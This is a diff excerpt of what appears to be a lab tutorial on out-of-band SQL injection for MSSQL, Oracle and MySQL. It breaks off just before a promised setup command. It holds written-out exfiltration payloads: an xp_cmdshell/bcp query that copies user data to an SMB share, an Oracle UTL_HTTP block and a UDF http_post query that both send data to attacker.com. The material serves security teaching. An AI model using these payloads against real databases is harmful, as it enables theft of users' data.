@@ -555,14 +555,58 @@ An attacker could then access this file via an SMB share or HTTP server running 
 In MSSQL, Out-of-band SQL injection can be performed using features like `xp_cmdshell`, which allows the execution of shell commands directly from SQL queries. This can be leveraged to write data to a file accessible via a network share:
 
 ```
-EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\MACHINE_IP\logs\out.txt" -c -T';
+EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
 ```
 
 Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.
 
+**Oracle**
 
+In Oracle databases, Out-of-band SQL injection can be executed using the `UTL_HTTP` or `UTL_FILE` packages. For instance, the `UTL_HTTP` package can be used to send HTTP requests with sensitive data:
 
+```
+DECLARE
+  req UTL_HTTP.REQ;
+  resp UTL_HTTP.RESP;
+BEGIN
+  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
+  UTL_HTTP.GET_RESPONSE(req);
+END;
+```
 
+---
+
+### Examples of Out-of-band Techniques
+
+Out-of-band SQL injection techniques in MySQL and MariaDB can utilise various network protocols to exfiltrate data. The primary methods include DNS exfiltration, HTTP requests, and SMB shares. Each of these techniques can be applied depending on the capabilities of the MySQL/MariaDB environment and the network setup.
+
+**HTTP Requests**
+
+By leveraging database functions that allow HTTP requests, attackers can send sensitive data directly to a web server they control. This method exploits database functionalities that can make outbound HTTP connections. Although MySQL and MariaDB do not natively support HTTP requests, this can be done through external scripts or User Defined Functions (UDFs) if the database is configured to allow such operations.
+
+First, the UDF needs to be created and installed to support HTTP requests. This setup is complex and usually involves additional configuration. An example query would look like `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`.
+
+HTTP request exfiltration can be implemented on Windows and Linux (Ubuntu) systems, depending on the database's support for external scripts or UDFs that enable HTTP requests.
+
+**DNS Exfiltration**
+
+Attackers can use SQL queries to generate DNS requests with encoded data, which is sent to a malicious DNS server controlled by the attacker. This technique bypasses HTTP-based monitoring systems and leverages the database's ability to perform DNS lookups.
+
+As discussed above, MySQL does not natively support generating DNS requests through SQL commands alone, attackers might use other means such as custom User-Defined Functions (UDFs) or system-level scripts to perform DNS lookups.
+
+Windows supports SMB/UNC paths directly, so they can be used without much extra setup. Linux, such as Ubuntu, does not support Windows-style UNC paths directly, but you can still access SMB shared folders using tools like smbclient or by mounting the share to a local folder. Using UNC paths directly in SQL queries on Linux may require some extra setup or scripts.
+
+UNC stands for Universal Naming Convention. It is a standard way to specify the location of a shared file or folder on a network, especially in Windows.
+
+---
+
+### Practical Example
+
+In this practical scenario, we will demonstrate how an attacker can exfiltrate data from a vulnerable web application using an Out-of-band SQL injection technique. The server-side code contains an SQL injection vulnerability that allows an attacker to craft a payload that writes the results of a query to an external SMB share. This is useful when direct responses from the database are restricted or monitored.
+
+**Scenario Explanation**
+
+the AttackBox (your attacking machine) will create a shared folder called `logs` on its network. This share is accessible over the network and allows files from other machines to be written to it.  You may assume a scenario when you get a vulnerable system and want to pivot data to another network share system. The attacker will leverage this share to exfiltrate data Out-of-band. To have a network share, we would start the AttackBox and execute the following command in the terminal:
 
 
 
